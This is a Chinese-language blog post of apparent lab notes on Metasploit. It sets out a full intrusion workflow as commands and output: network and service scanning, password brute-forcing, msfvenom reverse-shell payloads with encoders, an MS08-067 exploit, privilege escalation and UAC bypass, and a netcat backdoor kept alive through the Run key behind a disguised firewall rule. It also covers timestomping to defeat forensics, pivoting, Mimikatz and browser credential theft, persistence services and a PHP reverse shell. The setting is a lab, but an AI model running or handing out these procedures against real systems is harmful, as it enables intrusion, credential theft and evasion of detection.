<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfconsole -x &quot;use exploit/windows/smb/ms08_067_netapi;</span><br><span class="line">set rhosts 192.168.1.200;</span><br><span class="line">set target 34;</span><br><span class="line">set payload windows/meterpreter/reverse_tcp;</span><br><span class="line">set lhost 192.168.1.6;</span><br><span class="line">run -j&quot;</span><br></pre></td></tr></table></figure>

<hr>
<hr>
<hr>
<hr>
<h1 id="0x02-MSF信息收集"><a href="#0x02-MSF信息收集" class="headerlink" title="0x02.MSF信息收集"></a>0x02.MSF信息收集</h1><h2 id="一、内置外部工具"><a href="#一、内置外部工具" class="headerlink" title="一、内置外部工具"></a>一、内置外部工具</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">db_nmap 192.168.1.0/24</span><br></pre></td></tr></table></figure>

<h2 id="二、auxiliary模块"><a href="#二、auxiliary模块" class="headerlink" title="二、auxiliary模块"></a>二、auxiliary模块</h2><h3 id="例一，arp主机扫描"><a href="#例一，arp主机扫描" class="headerlink" title="例一，arp主机扫描"></a>例一，arp主机扫描</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">search arp</span><br><span class="line">use auxiliary/scanner/discovery/arp_sweep</span><br><span class="line">show options</span><br><span class="line">set interface eth0 # 设置网卡</span><br><span class="line">set rhosts 192.168.1.0/24 # 设置网段</span><br><span class="line">set threads 20 # 设置线程数</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<h3 id="例二，端口扫描"><a href="#例二，端口扫描" class="headerlink" title="例二，端口扫描"></a>例二，端口扫描</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">search portscan</span><br><span class="line">set interface eth0</span><br><span class="line">set ports 80</span><br><span class="line">set rhosts 192.168.1.0/24</span><br><span class="line">set threads 20</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<h3 id="例三，UDP扫描"><a href="#例三，UDP扫描" class="headerlink" title="例三，UDP扫描"></a>例三，UDP扫描</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/discovery/udp_sweep</span><br></pre></td></tr></table></figure>

<h3 id="例四，SMTP扫描"><a href="#例四，SMTP扫描" class="headerlink" title="例四，SMTP扫描"></a>例四，SMTP扫描</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi /etc/default/snmpd #修改侦听地址  0.0.0.0</span><br><span class="line">use auxiliary/scanner/snmp/snmp_login</span><br><span class="line">use auxiliary/scanner/snmp/snmp_enum</span><br><span class="line">use auxiliary/scanner/snmp/snmp_enumusers （windows）</span><br><span class="line">use auxiliary/scanner/snmp/snmp_enumshares （windows）</span><br></pre></td></tr></table></figure>

<h3 id="例五，SMB扫描"><a href="#例五，SMB扫描" class="headerlink" title="例五，SMB扫描"></a>例五，SMB扫描</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">版本扫描</span><br><span class="line">use auxiliary/scanner/smb/smb_version</span><br><span class="line"></span><br><span class="line">扫描命令管道，判断SMB服务类型（账号，密码）</span><br><span class="line">use auxiliary/scanner/smb/pipe_auditor</span><br><span class="line"></span><br><span class="line">扫描通过SMB管道可以访问的RCERPC服务</span><br><span class="line">use auxiliary/scanner/smb/pipe_dcerpc_auditor</span><br><span class="line"></span><br><span class="line">SMB枚举共享</span><br><span class="line">use auxiliary/scanner/smb/smb_enumshares</span><br><span class="line"></span><br><span class="line">SMB用户枚举</span><br><span class="line">use auxiliary/scanner/smb/smb_enumusers</span><br><span class="line"></span><br><span class="line">SMB SID（RID）枚举</span><br><span class="line">use auxiliary/scanner/smb/smb_lookupsid</span><br></pre></td></tr></table></figure>

<h3 id="例六，SSH扫描"><a href="#例六，SSH扫描" class="headerlink" title="例六，SSH扫描"></a>例六，SSH扫描</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">SSH版本扫描</span><br><span class="line">use auxiliary/scanner/ssh/ssh_versio</span><br><span class="line"></span><br><span class="line">SSH密码爆破</span><br><span class="line">use auxiliary/scanner/ssh/ssh_login</span><br><span class="line">set userpass_file /usr/share/metasploit-framework/data/wordlists/root_userpass.txt</span><br><span class="line"></span><br><span class="line">SSH公钥登入</span><br><span class="line">use auxiliary/scanner/ssh/ssh_login_pubkey</span><br></pre></td></tr></table></figure>



<h1 id="0x03-MSF漏洞扫描"><a href="#0x03-MSF漏洞扫描" class="headerlink" title="0x03.MSF漏洞扫描"></a>0x03.MSF漏洞扫描</h1><h2 id="实验案例"><a href="#实验案例" class="headerlink" title="实验案例"></a>实验案例</h2><h3 id="例一，vnc密码破解"><a href="#例一，vnc密码破解" class="headerlink" title="例一，vnc密码破解"></a>例一，vnc密码破解</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/vnc/vnc_login</span><br><span class="line">threads 30</span><br><span class="line">set BlANK_PASSWORDS yes</span><br><span class="line">set rhosts 192.168.1.5</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<h3 id="例二，vnc无密码访问"><a href="#例二，vnc无密码访问" class="headerlink" title="例二，vnc无密码访问"></a>例二，vnc无密码访问</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/vnc/vnc_none_auth</span><br><span class="line">set rhosts 192.168.1.5</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<h3 id="例三，RDP远程桌面漏洞"><a href="#例三，RDP远程桌面漏洞" class="headerlink" title="例三，RDP远程桌面漏洞"></a>例三，RDP远程桌面漏洞</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/rdp/ms12_020_check # 无DOS攻击</span><br><span class="line">set rhosts 192.168.1.200</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary/dos/windows/rdp/ms12_020_maxchannelids  # DOS攻击，蓝屏关机</span><br></pre></td></tr></table></figure>

<h3 id="例四，显示目录及文件"><a href="#例四，显示目录及文件" class="headerlink" title="例四，显示目录及文件"></a>例四，显示目录及文件</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/http/files_dir</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<h3 id="例五，WebDAV-Unicode编码身份验证绕过"><a href="#例五，WebDAV-Unicode编码身份验证绕过" class="headerlink" title="例五，WebDAV Unicode编码身份验证绕过"></a>例五，WebDAV Unicode编码身份验证绕过</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/http/dir_webdav_unicode_bypass</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<h3 id="例六，wmap"><a href="#例六，wmap" class="headerlink" title="例六，wmap"></a>例六，wmap</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">首先需要load wmap</span><br><span class="line">根据sqlmap工作模式开发</span><br></pre></td></tr></table></figure>

<h1 id="0x04-MSF客户端渗透"><a href="#0x04-MSF客户端渗透" class="headerlink" title="0x04.MSF客户端渗透"></a>0x04.MSF客户端渗透</h1><h2 id="实验案例-1"><a href="#实验案例-1" class="headerlink" title="实验案例"></a>实验案例</h2><h3 id="案例1"><a href="#案例1" class="headerlink" title="案例1"></a>案例1</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp lhost=192.168.1.6 lport=4444 -b &#x27;\x00\xff&#x27; -e x86/shikata_ga_nai -i 5 -f exe -o what.exe</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/shell/reverse_tcp</span><br><span class="line">set lhost 192.168.1.6</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<h1 id="0x05-后渗透测试"><a href="#0x05-后渗透测试" class="headerlink" title="0x05.后渗透测试"></a>0x05.后渗透测试</h1><h2 id="实验案例-2"><a href="#实验案例-2" class="headerlink" title="实验案例"></a>实验案例</h2><h3 id="提权，案例一"><a href="#提权，案例一" class="headerlink" title="提权，案例一"></a>提权，案例一</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp</span><br><span class="line">LHOST=192.168.1.6 LPORT=4444 -b &quot;\x00&quot; -e x86/shikata_ga_nai -f exe -o</span><br><span class="line">1.exe</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.1.6</span><br><span class="line">exploit -j</span><br><span class="line">运行1.exe</span><br><span class="line"></span><br><span class="line">得到LLuna用户权限</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: L-CD1028181A2B4\Lluna</span><br><span class="line"></span><br><span class="line">提权</span><br><span class="line">meterpreter &gt; getsystem </span><br><span class="line">...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br><span class="line"></span><br><span class="line">基于session提权(UAC允许)</span><br><span class="line">background</span><br><span class="line">use exploit/windows/local/ask</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.1.6</span><br><span class="line">set filename winupdate.exe</span><br><span class="line">set session 1</span><br><span class="line">点击确定get shell</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: L-CD1028181A2B4\Lluna</span><br><span class="line">meterpreter &gt; getsystem </span><br><span class="line">...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br><span class="line">meterpreter &gt; </span><br><span class="line"></span><br><span class="line">绕过UAC提权，会出现Already in elevated state（已经处于提升状态）</span><br><span class="line">use exploit/windows/local/bypassuac</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.1.6</span><br><span class="line">set session 1</span><br><span class="line"></span><br><span class="line">使用DDL动态链接库绕过</span><br><span class="line">use exploit/windows/local/bypassuac_injection</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.1.6</span><br><span class="line"></span><br><span class="line">使用漏洞提权</span><br><span class="line">use exploit/windows/local/ms13_053_schlamperei</span><br></pre></td></tr></table></figure>

<h3 id="案例二，使用注册表添加NC后门服务"><a href="#案例二，使用注册表添加NC后门服务" class="headerlink" title="案例二，使用注册表添加NC后门服务"></a>案例二，使用注册表添加NC后门服务</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32(上传nc)</span><br><span class="line">查看键值对</span><br><span class="line">reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run</span><br><span class="line">增加键值对</span><br><span class="line">reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d &#x27;C:\windows\system32\nc.exe -Ldp 444 -e cmd.exe&#x27;</span><br><span class="line"></span><br><span class="line">再次查看</span><br><span class="line">reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v nc</span><br><span class="line"></span><br><span class="line">打开一个隐式shell，并查看防火墙</span><br><span class="line">execute -f cmd -i -H</span><br><span class="line">netsh firewall show opmode</span><br><span class="line"></span><br><span class="line">如果开启则添加放行策略</span><br><span class="line">netsh firewall add portopening TCP 444 &quot;Core Networking - DNS (UDP-Out) - fjy&quot; ENABLE ALL</span><br><span class="line">(Core Networking - DNS (UDP-Out)为系统自带规则用于伪装)</span><br><span class="line"></span><br><span class="line">重启</span><br><span class="line">shutdown -r -t 0</span><br><span class="line"></span><br><span class="line">连接</span><br><span class="line">nc 192.168.1.200 444</span><br></pre></td></tr></table></figure>

<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200705201304290.png" class>

<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200705202016725.png" class>


<h3 id="案例三、抓包"><a href="#案例三、抓包" class="headerlink" title="案例三、抓包"></a>案例三、抓包</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">在获取到meterpreter shell的情况下</span><br><span class="line">meterpreter &gt; load sniffer    # 导入sniffer</span><br><span class="line">meterpreter &gt; sniffer_start 3 # 选择网卡进行抓包，抓包方法为在内存中缓存区块循环存储抓包，默认50000个包，不写硬盘中，并且智能过滤meterpreter流量，传输过程使用SSL/TLS加密。</span><br><span class="line">sniffer_dump 3 text.cap # 下载抓到的包</span><br><span class="line"></span><br><span class="line">抓到的包可以使用wireshark进行分析，也可以使用MSF自带解码进行解码</span><br><span class="line">use auxiliary/sniffer/psnuffle</span><br><span class="line">set PCAPFILE text.cap</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200706121725585.png" class>

<p>可以看到用户名与密码</p>
<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200706121809730.png" class>

<h3 id="案例四、文件搜索"><a href="#案例四、文件搜索" class="headerlink" title="案例四、文件搜索"></a>案例四、文件搜索</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; search -f *.ini</span><br><span class="line">search -d C:\\Users\ and\ settings\\administrator\\desktop\\ -f *.docx</span><br></pre></td></tr></table></figure>

<h3 id="案例五、时间取证分析"><a href="#案例五、时间取证分析" class="headerlink" title="案例五、时间取证分析"></a>案例五、时间取证分析</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">文件系统访问会留下痕迹，电子取证重点关注。</span><br><span class="line">渗透测试者与攻击者往往希望销毁文件系统的访问痕迹。</span><br><span class="line">最好的避免被文件取证就是不要触碰文件系统。</span><br><span class="line">meterpreter的优势在于完全基于内存。</span><br><span class="line">MAC 时间（Modified / Accessed / Changed）</span><br><span class="line">M为文件修改时间，A为文件的访问时间，C为文件权限的修改时间</span><br><span class="line"></span><br><span class="line">在系统下修改时间：</span><br><span class="line">ls -l --time=atime/ctime 1.txt # 默认为mtime</span><br><span class="line">stat 1.txt # 列出全部时间</span><br><span class="line">touch -d &quot;2 days ago&quot; 1.txt # 修改MA时间</span><br><span class="line">touch -t 1501010101 1.txt # 修改精确时间，年月日</span><br><span class="line"></span><br><span class="line">在meterpreter下修改时间：</span><br><span class="line">meterpreter &gt; timestomp -v 111 # 查看111文件的MAC时间</span><br><span class="line">timestomp -f C:\\WINDOWS\\0.log 111 # -f为指定一个模板，将111的时间改为0.log的时间</span><br><span class="line"></span><br><span class="line">timestomp -a &quot;11/11/2018 11:11:11&quot; 111 # 指定修改A的时间</span><br><span class="line">timestomp -m &quot;11/11/2018 11:11:11&quot; 111 # 指定修改M的时间</span><br><span class="line">timestomp -c &quot;11/11/2018 11:11:11&quot; 111 # 指定修改M的时间</span><br><span class="line">timestomp -z &quot;11/11/2024 11:11:11&quot; 111 # 一次修改三个时间</span><br><span class="line">timestomp -e &quot;11/11/2020 11:11:11&quot; 111 # 指定修改E(Entry Modified)时间</span><br><span class="line">Entry Modified为MFT，为NTFS的文件系统的主文件分配表</span><br><span class="line">-b -r 为擦除MACE时间表，目前已失效。</span><br></pre></td></tr></table></figure>

<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200706141936093.png" class>

<h3 id="案例六、使用Pivoting（基于路由）实现跳板-枢纽-支点get-shell"><a href="#案例六、使用Pivoting（基于路由）实现跳板-枢纽-支点get-shell" class="headerlink" title="案例六、使用Pivoting（基于路由）实现跳板/枢纽/支点get shell"></a>案例六、使用Pivoting（基于路由）实现跳板/枢纽/支点get shell</h3><h4 id="1-实验拓扑"><a href="#1-实验拓扑" class="headerlink" title="1.实验拓扑"></a>1.实验拓扑</h4><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707152622464.png" class>

<h4 id="2-实验目的"><a href="#2-实验目的" class="headerlink" title="2.实验目的"></a>2.实验目的</h4><blockquote>
<p>1.kali使用msf生成名为haha.exe的执行程序，并诱使win_2k03执行，然后反弹给kali一个meterpreter shell。</p>
<p>2.得到shell后以win_2k03为跳板，控制win_XP。</p>
</blockquote>
<h4 id="3-实验过程"><a href="#3-实验过程" class="headerlink" title="3.实验过程"></a>3.实验过程</h4><p>1.配置防火墙m0n01，配置NAT</p>
<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707153518682.png" class>

<p>2.配置WLAN关闭拒绝私有网段访问，使访问其他主机访问192.168.1.4能够实现NAT。</p>
<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707153857414.png" class>

<p>3.配置m0n02规则，允许全部网段可以出去</p>
<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707155315502.png" class>

<p>4.测试</p>
<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707155229810.png" class>

<p>5.生成haha.exe</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@JIYE:~# msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.4 LPORT=4444 -b &quot;\x00&quot; -e x86/shikata_ga_nai -f exe -o haha.exe</span><br></pre></td></tr></table></figure>

<p>6.win_2k03下载并访问（诱骗）</p>
<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707155813729.png" class>

<p>7.kali监听，win_2k03运行haha.exe</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfconsole -q</span><br><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.253.22  # 这里不是192.168.1.4</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707160150775.png" class>

<p>8.添加到达192.168.254.0的路由，使以后192.168.254.0的路由都走session1</p>
<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707162846401.png" class>

<p>9.扫描网段</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/portscan/tcp</span><br><span class="line">set rhosts 192.168.254.20-192.168.254.30</span><br><span class="line">set ports 139,445</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>可以看到20与22是存活的</p>
<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707163857984.png" class>

<p>10.使用nmap扫描，可以看到添加的路由对nmap没有作用。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">db_nmap -A -p 445 -Pn 192.168.254.22</span><br></pre></td></tr></table></figure>

<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707164742663.png" class>

<p>11.利用ms08067 get XP shell</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/ms08_067_netapi</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set rhosts 192.168.254.22</span><br><span class="line">set target 34</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>这里win2k03挂了，所以我换了个win7，但出现了个问题。弹出了一个消息点击允许就可以得到shell，但我失败了。。。</p>
<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707214348635.png" class>

<p>来baby让我们换个思路，竟然反弹给win2k03失败，那么能不能反弹给他的上一级m0n0的wlan口，理论上是可以，因为我们已经加了一条192.168.254.0/24的路由，并且网关为session9，尝试一下是可以的。</p>
<p>这里在连接win2k03的session中一定要加192.168.254.0/24的路由</p>
<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707221947516.png" class>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">set lhost 192.168.1.4</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>已经拿到win_XP的shell</p>
<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707221620618.png" class>

<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707222926242.png" class>

<p>两个shell都拿到手了。</p>
<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707221906308.png" class>

<p>那么这种情况下的shell并不是从win2k03拿到的，如下图，而是由session 9建立连接，发送XP payload，执行后直接反弹给m0n0的wlan口，并不经过win2k03。</p>
<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707223402391.png" class>

<p>再看一下win2k03（win7）</p>
<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707222635457.png" class>

<p>综上，实验完成。</p>
<h3 id="案例七、使用Pivoting（基于端口转发）实现跳板-枢纽-支点get-shell"><a href="#案例七、使用Pivoting（基于端口转发）实现跳板-枢纽-支点get-shell" class="headerlink" title="案例七、使用Pivoting（基于端口转发）实现跳板/枢纽/支点get shell"></a>案例七、使用Pivoting（基于端口转发）实现跳板/枢纽/支点get shell</h3><p>删除session 9 的路由</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -d -s 192.168.254.0/24</span><br><span class="line">run autoroute -p</span><br></pre></td></tr></table></figure>

<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707224245019.png" class>

<p>添加一个端口映射</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; portfwd add -L 192.168.253.22 -l 3389 -r 192.168.254.22 -p 3389</span><br></pre></td></tr></table></figure>

<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707224822057.png" class>

<p>执行，拿到shell。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@JIYE:~# rdesktop 192.168.253.22</span><br></pre></td></tr></table></figure>

<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707225206502.png" class>

<p>登入xp会弹警告</p>
<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707225911526.png" class>

<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707230006676.png" class>

<p>kali连接上的时候xp用户会注销</p>
<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707230225787.png" class>

<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707230115548.png" class>

<p>完。。。</p>
<h3 id="案例八，多sessions连接"><a href="#案例八，多sessions连接" class="headerlink" title="案例八，多sessions连接"></a>案例八，多sessions连接</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.4 LPORT=4444 -b &quot;\x00&quot; -e x86/shikata_ga_nai -f exe -o a.exe</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.1.4</span><br><span class="line">set exitonsession # 持续监听4444端口，能够同时获取多个session</span><br><span class="line">run -j -z</span><br></pre></td></tr></table></figure>
<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200709110800149.png" class>

<p>使用post模块进行后渗透测试</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run post/windows/gather/arp_scanner RHOSTS=192.168.1.0/24 #扫描整个网段</span><br><span class="line">run post/windows/gather/checkvm # 扫描虚拟机</span><br><span class="line">run post/windows/gather/credentials/credential_collector #　扫描身份验证信息(账号)token</span><br><span class="line">run post/windows/gather/enum_applications # 扫描安装软件的信息</span><br><span class="line">run post/windows/gather/enum_logged_on_users # 扫描正处于登入的账号(500为管理员)</span><br><span class="line">run post/windows/gather/enum_snmp # 查看snmp相关配置</span><br><span class="line">run post/multi/recon/local_exploit_suggester # 扫描本地可以用于提权的漏洞模块</span><br><span class="line">run post/windows/manage/delete_user USERNAME=a # 删除用户</span><br><span class="line">run post/multi/gather/env # 查看系统环境信息</span><br><span class="line">run post/multi/gather/firefox_creds # 查看火狐浏览器保存的密码</span><br><span class="line">run post/multi/gather/ssh_creds # 查看本地保存的ssh用户名密码信息</span><br><span class="line">run post/multi/gather/check_malware REMOTEFILE=c:\\a.exe # 检查目标系统文件是否为恶意文件</span><br><span class="line">run hostsedit -e 192.168.1.4,www.baidu.com # 修改hosts文件</span><br></pre></td></tr></table></figure>

<p>设置制动执行脚本，使得到的session进程为explorer</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt; set AutorunScript migrate -n explorer.exe</span><br><span class="line">run -j -z</span><br><span class="line"></span><br><span class="line">set InitialAutoRunScript migrate -n explorer.exe</span><br><span class="line">set AutoRunScript post/windows/gather/dumplinks</span><br></pre></td></tr></table></figure>

<h3 id="案例九，建立持久连接"><a href="#案例九，建立持久连接" class="headerlink" title="案例九，建立持久连接"></a>案例九，建立持久连接</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run metsvc -A # 在目标机器创建一个系统服务并启动</span><br></pre></td></tr></table></figure>

<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200709150301191.png" class>

<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200709150337750.png" class>

<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200709150449642.png" class>

<p>连接</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/metsvc_bind_tcp</span><br><span class="line">set rhost  192.168.1.200</span><br><span class="line">set lport 31337</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>其他方法</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run persistence -X -r 192.168.1.200 -p 4444 -i 10 # 当XP重启时会重新连接</span><br></pre></td></tr></table></figure>

<p>重启XP直连</p>
<h3 id="案例十，MSF延展Mimikatz"><a href="#案例十，MSF延展Mimikatz" class="headerlink" title="案例十，MSF延展Mimikatz"></a>案例十，MSF延展Mimikatz</h3><p>hashdump就是使用mimikatz的部分功能</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">导入</span><br><span class="line">load mimikatz</span><br><span class="line">msv # 查看系统用户信息（hash）</span><br><span class="line">ssp # 查看用户明文信息</span><br><span class="line">tspkg # 票据</span><br><span class="line">wdigest # 可以查看到内存中存在的用户名密码</span><br></pre></td></tr></table></figure>

<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200709161910259.png" class>

<p>参数</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">getsystem</span><br><span class="line">load mimikatz</span><br><span class="line">wdigest ̵kerberos ̵msv ̵ssp ̵tspkg ̵livessp</span><br><span class="line">mimikatz_command -h</span><br><span class="line">mimikatz_command -f a::  # 查看哪些模块可以使用</span><br><span class="line">mimikatz_command -f samdump::hashes  # </span><br><span class="line">mimikatz_command -f handle::list  # 查看系统进程</span><br><span class="line">mimikatz_command -f service::list # 查看系统服务，可以开启服务也可以停止服务</span><br><span class="line">mimikatz_command -f crypto::listProviders  # 查看支持的加密套件</span><br><span class="line">mimikatz_command -f winmine::infos # 破解扫雷游戏。。。</span><br></pre></td></tr></table></figure>

<h3 id="案例十一，PHP-shell"><a href="#案例十一，PHP-shell" class="headerlink" title="案例十一，PHP shell"></a>案例十一，PHP shell</h3><p>通过浏览器访问执行php文件拿到shell</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.4 LPORT=3333 -f</span><br><span class="line">raw -o a.php</span><br><span class="line"></span><br><span class="line">set payload php/meterpreter/reverse_tcp</span><br><span class="line">set lport 3333</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>浏览器访问</p>
<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200709165542747.png" class>

<p>getshell</p>
<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200709165601746.png" class>

